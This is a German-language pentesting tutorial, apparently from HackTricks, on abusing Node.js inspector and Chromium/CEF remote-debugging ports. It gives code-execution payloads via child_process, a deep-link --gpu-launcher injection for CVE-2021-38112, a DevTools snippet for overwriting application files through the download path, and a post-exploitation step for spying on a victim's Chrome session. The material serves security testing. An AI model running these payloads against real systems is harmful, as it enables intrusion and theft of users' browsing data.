# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

[Aus der Dokumentation](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wenn ein Node.js-Prozess mit dem Schalter `--inspect` gestartet wird, wartet er auf einen Debugging-Client. Standardmäßig lauscht er unter Host und Port **`127.0.0.1:9229`**. Jedem Prozess wird außerdem eine **eindeutige** **UUID** zugewiesen.

Inspector-Clients müssen die Hostadresse, den Port und die UUID kennen und angeben, um eine Verbindung herzustellen. Eine vollständige URL sieht etwa so aus: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Da der **Debugger vollständigen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein Angreifer, der eine Verbindung zu diesem Port herstellen kann, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**potenzielle Privilege Escalation**).

Es gibt mehrere Möglichkeiten, einen Inspector zu starten:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wenn du einen inspizierten Prozess startest, wird etwa Folgendes angezeigt:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prozesse auf Basis von **CEF** (**Chromium Embedded Framework**) wie diese benötigen den Parameter `--remote-debugging-port=9222`, um den **debugger** zu öffnen (die SSRF-Schutzmechanismen bleiben sehr ähnlich). Sie gewähren jedoch **keine** **NodeJS**-**debug**-Sitzung, sondern kommunizieren mit dem Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/). Dabei handelt es sich um eine Schnittstelle zur Steuerung des Browsers, es gibt jedoch keine direkte RCE.

Wenn du einen **debug**-fähigen Browser startest, erscheint etwas wie Folgendes:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser, WebSockets und Same-Origin-Policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet werden, können WebSocket- und HTTP-Anfragen unter dem Browser-Sicherheitsmodell senden. Eine **initiale HTTP-Verbindung** ist notwendig, um eine **eindeutige Debugger-Sitzungs-ID** zu **erhalten**. Die **Same-Origin-Policy** **verhindert**, dass Websites **diese HTTP-Verbindung** herstellen können. Als zusätzliche Sicherheitsmaßnahme gegen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** überprüft Node.js, dass die **'Host'-Header** der Verbindung entweder eine **IP-Adresse** oder genau **`localhost`** oder **`localhost6`** angeben.

> [!TIP]
> Diese **Sicherheitsmaßnahme verhindert, den Inspector auszunutzen**, um Code auszuführen, indem **nur eine HTTP-Anfrage gesendet wird** (was durch das Ausnutzen einer SSRF-Schwachstelle möglich wäre).

### Inspector in laufenden Prozessen starten

Du kannst das **Signal SIGUSR1** an einen laufenden Node.js-Prozess senden, damit dieser den **Inspector** am Standardport **startet**. Beachte jedoch, dass du über ausreichende Berechtigungen verfügen musst. Dadurch kann dir **privilegierter Zugriff auf Informationen innerhalb des Prozesses** gewährt werden, jedoch keine direkte Privilege Escalation.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dies ist in Containern nützlich, da das **Herunterfahren des Prozesses und Starten eines neuen** mit `--inspect` **keine Option** ist, weil der **Container** zusammen mit dem Prozess **beendet** wird.

### Mit dem Inspector/Debugger verbinden

Um eine Verbindung zu einem **Chromium-basierten Browser** herzustellen, können die URLs `chrome://inspect` bzw. `edge://inspect` für Chrome bzw. Edge aufgerufen werden. Durch Klicken auf die Schaltfläche „Configure“ sollte sichergestellt werden, dass der **Zielhost und -port** korrekt aufgeführt sind. Das Bild zeigt ein Beispiel für Remote Code Execution (RCE):

![Nachdem eine URL für den Zugriff auf den Debugger angezeigt wird, z. B. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d – Mit dem Inspector/Debugger verbinden: Um eine Verbindung zu einem Chromium-basierten Browser herzustellen, ...](<../../images/image (674).png>)

Über die **Befehlszeile** kann eine Verbindung zu einem Debugger/Inspector hergestellt werden mit:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, **lokal laufende Inspectors zu finden** und **Code in sie zu injizieren**.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Beachte, dass **NodeJS RCE-Exploits nicht funktionieren**, wenn eine Verbindung zu einem Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) besteht (du musst die API überprüfen, um interessante Verwendungsmöglichkeiten dafür zu finden).

## RCE im NodeJS Debugger/Inspector

> [!TIP]
> Wenn du hierher gekommen bist, um herauszufinden, wie du [**RCE über eine XSS in Electron erhältst, sieh dir bitte diese Seite an.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Einige gängige Möglichkeiten, **RCE** zu erhalten, wenn du dich mit einem Node **Inspector** verbinden kannst, bestehen in der Verwendung von etwas wie dem Folgenden (dies scheint bei einer Verbindung zum **Chrome DevTools Protocol** nicht zu funktionieren):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In diesem Abschnitt liste ich lediglich interessante Dinge auf, von denen ich festgestellt habe, dass sie von Personen zur Ausnutzung dieses Protokolls verwendet wurden.

### Parameter Injection via Deep Links

In der [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine auf CEF basierende Anwendung eine benutzerdefinierte UR**I** im System (workspaces://index.html) **registriert** hatte, die die vollständige URI empfing und anschließend die auf CEF basierende Applicatio**n** mit einer Konfiguration startete, die teilweise aus dieser URI erstellt wurde.

Es wurde entdeckt, dass die URI-Parameter URL-decoded und zum Starten der grundlegenden CEF-Anwendung verwendet wurden. Dadurch konnte ein Benutzer das Flag **`--gpu-launcher`** in die **command line** **injecten** und beliebige Dinge ausführen.

Ein Payload wie dieser:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wird eine calc.exe ausführen.

### Dateien überschreiben

Ändere den Ordner, in dem **heruntergeladene Dateien gespeichert werden**, und lade eine Datei herunter, um häufig verwendeten **Quellcode** der Anwendung mit deinem **schädlichen Code** zu überschreiben.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE und Exfiltration

Laut diesem Beitrag: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) ist es möglich, RCE zu erhalten und interne Seiten von theriver zu exfiltrieren.

### Post-Exploitation

In einer realen Umgebung und **nach der Kompromittierung** eines Benutzer-PCs, auf dem ein Chrome-/Chromium-basierter Browser verwendet wird, könntest du einen Chrome-Prozess mit **aktiviertem Debugging starten und den Debugging-Port weiterleiten**, sodass du darauf zugreifen kannst. Auf diese Weise kannst du **alles überprüfen, was das Opfer mit Chrome macht, und vertrauliche Informationen stehlen**.

Der unauffällige Weg besteht darin, **jeden Chrome-Prozess zu beenden** und anschließend etwas wie folgendes aufzurufen
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referenzen

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
